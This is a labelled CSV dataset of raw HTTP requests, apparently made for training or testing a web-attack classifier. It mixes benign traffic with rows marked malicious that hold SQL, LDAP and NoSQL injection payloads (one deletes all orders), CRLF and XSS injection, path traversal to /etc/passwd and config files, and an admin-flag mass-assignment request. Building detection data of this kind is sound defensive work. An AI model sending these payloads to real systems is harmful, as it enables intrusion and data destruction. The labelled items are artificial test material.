label,text
benign,"GET /news/finance/market-trends-quarterly-report HTTP/1.1
Host: finview-reports.biz
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Referer: https://finview-reports.biz/news/finance
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"GET /search/?search_term=latest+technology+conference+2024 HTTP/1.1
Host: global-tech-events.info
Accept: text/html
Referer: https://global-tech-events.info/home
User-Agent: curl/7.88.1
Accept-Encoding: identity
Connection: keep-alive"
benign,"GET /blog/article/view/523?utm_source=affiliate&utm_medium=partner HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html
Referer: https://forums.community.game-dev-forum.org/topics/latest
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Connection: close"
benign,"GET /api/v2/flight/status?flight=AA2469&date=2024-06-15 HTTP/1.1
Host: travel-info-provider.global
Accept: application/json
X-Requested-With: XMLHttpRequest
Authorization: Bearer 24d7e69ba2f642cd9630cf7a5b2d9011
Origin: https://travel-info-provider.global
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache"
benign,"POST /account/update HTTP/1.1
Host: sales.crmsoftware-solutions.net
Authorization: Bearer token-9876543210-abcdefghij
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Length: 81

{""isAdmin"":false,""phone"":""+447911123456"",""preferences"":{""contactByEmail"":true}}"
benign,"POST /photos/upload HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Accept: image/*,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----MobileBoundary0987
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/user/uploads
Cookie: auth_key=0987asdcfghjklpoiuytrewq12345
Connection: keep-alive

------MobileBoundary0987
Content-Disposition: form-data; name=""caption""

Store window display update
------MobileBoundary0987
Content-Disposition: form-data; name=""image_file""; filename=""storefront_photo.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------MobileBoundary0987--"
benign,"GET /api/v1/users/search?query=jane.doe&age_min=25&age_max=40&location=Boston&interests=travel,fashion&sort_by=last_active&limit=10&offset=0&verified=true&include_blocked=false&expand=profile_photos HTTP/1.1
Host: social-connect.live
User-Agent: Instagram 259.0.0.19.119 (iPhone14,3; iOS 16_4; en_US; en-US; scale=3.00; 2778x1284; 265141663)
Accept: application/json
Accept-Language: en-US
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"POST /register/newuser HTTP/1.1
Host: secure-cloud-analytics.org
Content-Type: application/json
Accept: application/json
Origin: https://secure-cloud-analytics.org
X-Requested-With: XMLHttpRequest
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Connection: close
Content-Length: 148

{""email"":""automated.signup5@secure-cloud-analytics.org"",""password"":""BotPass123"",""userAgent"":""Googlebot"",""registeredVia"":""API""}"
benign,"DELETE /api/v1/photos/3a5e4cbd HTTP/1.1
Host: creative-portfolio-site.org
Authorization: Bearer mktPLJ87SxuzHD039JjD
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: close"
benign,"HEAD /portfolio/recent-projects HTTP/1.1
Host: creative-studio-space.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Via: 1.1 varnish
Connection: keep-alive"
malicious,"POST /internal/ldap/search HTTP/1.1
Host: corp-infra-access.io
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/json
Content-Length: 95
Referer: https://corp-infra-access.io/dashboard

{""searchFilter"": ""(cn=analytics)(objectClass=person)(!(employeeType=contractor))(|(uid=administrator))""}"
malicious,"GET /api/v2/items/search?search_term=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: query-optimizer-service.net
User-Agent: Wget/1.20 (linux-gnu)
Accept: */*
Connection: close"
malicious,"GET /media/upload/filename%0d%0aX-Hacked:%20true%0d%0a%0d%0a<script>prompt('Injected')</script> HTTP/1.1
Host: file-hosting-service.cloud
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: keep-alive"
benign,"GET /account/orders/history HTTP/1.1
Host: online-retail-store.biz
Accept-Language: en-US,en;q=0.9
Accept: text/html,application/xhtml+xml,application/xml
Cookie: sessionid=xyz9876wvu54321; cart_session=ABCD1234; pref_currency=USD; authenticated=yes
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: keep-alive
Cache-Control: max-age=0"
malicious,"GET /api/v1/user/data HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Python-urllib/3.9 <script>alert('LogViewerXSS')</script>
Accept-Encoding: identity
Connection: close"
malicious,"POST /api/verify HTTP/1.1
Host: payment-gateway-service.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/json
Accept: application/json
Content-Length: 42

{""transaction_id"": ""TX1234567890"", ""status"": ""ok""}"
benign,"GET /api/v3/events/log?id=1024&level=info&date=2024-06-01 HTTP/1.1
Host: logvault-secure.ai
Accept: application/json, text/plain, */*
User-Agent: python-requests/2.28.2
X-Forwarded-For: 198.51.100.23
Connection: keep-alive
Accept-Encoding: gzip, deflate, br"
benign,"GET /app/user/settings?session_id=xyz789session&utm_campaign=feature_announcement HTTP/1.1
Host: secure-user-portal.net
Accept: text/html
Accept-Language: en-US,en;q=0.7
Referer: https://login.secure-user-portal.net/dashboard
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: digital-archive-solutions.tech
Accept-Encoding: br, gzip, deflate
Content-Type: text/plain
Content-Length: 29
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36
Origin: https://client.digital-archive-solutions.tech

Metadata updated for asset 442"
benign,"GET /downloads/reports?file=report-final.pdf HTTP/1.1
Host: docs-archive-secure.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/pdf,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://docs-archive-secure.net/dashboard
Connection: keep-alive"
benign,"GET /api/v5/books/library/9780316499019 HTTP/1.1
Host: global-library-api.educationhub.org
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip
Via: 1.1 vegur
Connection: keep-alive"
malicious,"GET /blog/article/view?category=2%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Cookie: user_sid=xyz789abc123; theme=dark"
benign,"GET /js/main.bundle.js HTTP/1.1
Host: media-content-aggregate.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: application/javascript, */*;q=0.8
Referer: https://media-content-aggregate.net/dashboard
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
malicious,"PUT /user/profile/update HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NfdHlwZSI6InVzZXIiLCJ1aWQiOiIxMjM0NTY3ODkwIn0.-_AG_1iDRk_-tQblwR0IN9Gf1dQfTzBB0RgxwBgUiAQ
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9

{
  ""user_details"": {
    ""name"": ""attacker"",
    ""address"": ""123 evil st""
  },
  ""account_info"": {
    ""subscription_level"": ""premium"",
    ""override_settings"": {
      ""is_feature_xyz_enabled"": true,
      ""credits_override"": 99999
    }
  }
}"
malicious,"GET /api/v2/settings/load HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://secure-user-portal.net/app/dashboard
Cookie: lang_selection=../../../../etc/nginx/nginx.conf%00default; token=3d2a7cd2518f9b"
malicious,"GET /media/viewer HTTP/1.1
Host: digital-media-streaming.tv
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Cookie: skin=../../../../skins/custom/theme.cfg%00nl-NL; sid=2b3c1f6a7e0e
Accept-Encoding: br, gzip, deflate
Referer: https://digital-media-streaming.tv/dashboard"
benign,"POST /preferences/update HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Origin: https://my-personal-blog-site.info
Accept-Language: en-US,en;q=0.9
Cookie: user_pref=dark_mode=1; session=7b1c3a5d9f

font_size=medium&theme=classic&show_comments=yes"
malicious,"GET /content/load?file=homepage HTTP/1.1
Host: content-delivery-network.co
User-Agent: Wget/1.21.1
Accept: */*
Cookie: content_path=../../../../private/config.ini%00es-ES; session=3571dbf109a9412c8d3277da
Accept-Encoding: gzip
Referer: https://content-delivery-network.co/home"
benign,"POST /users/request_password_reset HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://community.game-dev-forum.org/login
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Cache-Control: max-age=0

email=emily.wang%40gdfcommunity.org"
benign,"POST /collect/user_event HTTP/1.1
Host: logs.community-dev-forum.org
Origin: https://community-dev-forum.org
Content-Type: text/plain
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
Content-Length: 62

{""event"":""scroll"",""position"":720,""page"":""/topics/3423""}"
benign,"POST /as/token.oauth2 HTTP/1.1
Host: identity-provider-cloud.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Authorization: Basic c2VjdXJlQXBwSWQ6dDJzUXJ4eTUw
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: application/json,text/plain
Referer: https://app.identity-provider-cloud.net/login
Accept-Encoding: gzip, deflate, br

grant_type=refresh_token&refresh_token=def50200ab3a5e63d0fa1a1445a7c120c1b60&client_id=secureApp42&client_secret=t2sQrxy50&redirect_uri=https%3A%2F%2Fapp.identity-provider-cloud.net%2Fauth%2Fredirect"
malicious,"POST /api/account/update HTTP/1.1
Host: logon.secure-payment-gateway.cc
Content-Type: application/json
X-CSRF-Token: fbc12ca8d0b440c9ba70db952457fa94
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.5
Referer: https://logon.secure-payment-gateway.cc/dashboard
Cache-Control: max-age=0

{
  ""username"": ""pay_user77"",
  ""email"": ""payuser77@secure-payment-gateway.cc"",
  ""isAdmin"": true,
  ""subscription_plan"": ""vip""
}"
benign,"POST /api/v1/orders/new HTTP/1.1
Host: shoptech-global.net
Content-Type: application/json
Content-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

{""customerId"":74219,""items"":[{""productId"":9932,""quantity"":1},{""productId"":3721,""quantity"":3}],""paymentMethod"":""credit_card"",""shippingAddress"":{""line1"":""789 Maple Ave"",""city"":""Springfield"",""state"":""IL"",""zip"":""62704""}}"
malicious,"POST /feedback/submit HTTP/1.1
Host: express-delivery-service.org
User-Agent: Wget/1.21.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Accept: */*
Origin: https://express-delivery-service.org

comments=Great%20service!'});db.orders.deleteMany({}); //&rating=5"
benign,"POST /user/profile/update HTTP/1.1
Host: connect-elevate-cloud.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 499
Connection: keep-alive
Cookie: sessionid=ab12cd34ef5678901234; theme=light

first_name=Laura&last_name=Henderson&email=laura.henderson%40connectio.io&phone=+14155552671&address_line1=439+Pine+Street&address_line2=Suite+204&city=Seattle&state=WA&postal_code=98101&country=USA&birth_date=1985-07-19&gender=female&language=en&timezone=America%2FLos_Angeles&newsletter=yes&sms_notifications=no&preferred_contact=email&linkedin=https%3A%2F%2Fwww.linkedin.com%2Fin%2Flhenderson&twitter=@laurahenderson&occupation=project+manager&company=Elevate+Solutions&website=https%3A%2F%2Fwww.elevate-solutions.io&about=Passionate+about+technology+and+team+leadership.+Experienced+in+PMO&extra_field1=value1&extra_field2=value2"
benign,"GET /api/v5/user-roles?filter[type]=admin&filter[active]=true HTTP/1.1
Host: enterprise-cloud-solutions.net
Accept: application/json
X-CSRF-Token: Y29tcGxleGx5U2VjdXJlVG9rZW4xMjM0NTY=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Referer: https://enterprise-cloud-solutions.net/admin/dashboard"
benign,"GET /documents/e-books/learn-python3.epub HTTP/1.1
Host: ebook-collection.libraryapp.org
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: application/epub+zip,application/octet-stream
Range: bytes=0-1023
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive"
benign,"GET /scripts/utils.min.js HTTP/1.1
Host: green-energy-solutions.org
Accept: */*
Referer: https://green-energy-solutions.org/projects/wind-turbine/stats
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip, deflate"
benign,"GET /shop/categories/electronics/headphones HTTP/1.1
Host: urban-tech-deals.us
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://urban-tech-deals.us/shop
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"PUT /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Length: 26

{""filePath"": ""/etc/passwd""}"
benign,"GET /products;category=books/discounts HTTP/1.1
Host: promotions-online-deals.co
Accept: application/json, text/plain, */*
User-Agent: python-requests/2.31.0
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"HEAD /index.html HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive
Referer: https://community.game-dev-forum.org/home"
benign,"POST /api/v1/devices/configure HTTP/1.1
Host: smart-home-hub.io
Authorization: Token kndd9239nddjslwoeir9234n2nc2
Content-Type: application/json
Accept-Encoding: gzip
User-Agent: Python-urllib/3.9
Content-Length: 140

{""device.configurations"":{""lighting-mode"": ""eco"",""temp_threshold.degrees"": 22.5},""device.id"": ""smarthub-00432"",""user.preferences"": {""notifications_enabled"": true}}"
benign,"GET /api/v1/users?role=moderator&active=true&sort=last_login HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
Authorization: Basic dXNlcm5hbWU6c2VjdXJlcGFzcw==
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
DNT: 1"
benign,"PUT /api/v4/sessions/287649/token HTTP/1.1
Host: api.online-retail-store.biz
Authorization: Bearer zXc123Qwe456Plm890AoPqRstU
Origin: https://www.online-retail-store.biz
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Connection: keep-alive
Content-Length: 51

{""sessionExpiry"":""2024-12-31T23:59:59Z"",""keepAlive"":true}"
benign,"GET /blog/posts/2024/04/innovative-low-code-platforms HTTP/1.1
Host: tech-chronicle.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Connection: keep-alive
Referer: https://tech-chronicle.info/
Upgrade-Insecure-Requests: 1"
benign,"GET /robots.txt HTTP/1.1
Host: greenfield-research-labs.org
User-Agent: DataExplorerBot/3.5 (+https://greenfield-research-labs.org/botinfo)
Accept: text/plain
Cache-Control: no-cache
Connection: keep-alive"
